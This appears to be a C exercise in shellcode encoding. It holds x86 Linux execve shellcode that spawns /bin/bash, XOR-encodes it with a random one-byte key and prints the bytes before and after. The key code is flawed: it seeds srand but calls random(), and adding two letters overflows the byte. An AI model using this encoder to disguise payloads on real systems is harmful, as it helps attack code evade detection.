#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

void print_array(unsigned char *shellcode, long unsigned int arr_size) {
    for (int i = 0; i < arr_size; i++) {
        printf("%x", shellcode[i]);
    }
    printf("\n");
}

unsigned char generate_key() {
    srand(time(0));
    unsigned char key = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"[random () % 26] + "ABCDEFGHIJKLMNOPQRSTUVWXYZ"[random () % 26];
    return key;
}

unsigned char encrypt(unsigned char *shellcode, long unsigned int arr_size, unsigned char *key) {
    for (int i = 0; i < arr_size; i++) {
        shellcode[i] = shellcode[i] ^ *key;
    }
    return *shellcode;
}

int main(void) {
    unsigned char shellcode[] = \
    "\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f"
    "\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
    
    printf("Shellcode before encryption:");
    print_array(shellcode, sizeof(shellcode));
    
    printf("Generating key:");
    unsigned char key = generate_key();
    printf("%x\n", key);

    printf("Encrypted shellcode:");
    encrypt(shellcode, sizeof(shellcode), &key);
    print_array(shellcode, sizeof(shellcode));

    return 0;
}